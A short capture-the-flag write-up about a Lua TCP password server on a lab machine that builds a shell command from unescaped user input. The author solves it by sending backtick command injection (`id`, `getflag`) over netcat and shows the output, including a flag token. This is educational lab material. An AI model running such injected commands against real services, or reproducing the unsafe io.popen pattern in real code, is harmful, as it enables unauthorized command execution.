There is a Lua script:

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end

  client:close()
end
```

\- The program already runs. It creates a TCP server and listen on port 5151. 
It ask for a password and hash it with the sha1sum command in a subprocess.
It then takes the 40 first character of the hashed password and check if it's equal to f05d1d066fb246efe0c6f7d095f909a7a0cf34a0. So we have to crack the password.

\- Looking into a rainow table like crackstation.com and we see that the hash is a known hash into the table. -> NotSoEasy

\- It was actually a rabbit hole. After few research, we see that lua is easily vulnerable to command injection with unverified user input. We can execute command like this:

```
> nc localhost 5151                                                 Password: `id` > /tmp/flag
> cat /tmp/flag
uid=3011(flag11) gid=3011(flag11) groups=3011(flag11),1001(flag)

> nc localhost 5151                                                 Password: `getflag` > /tmp/flag
> cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

```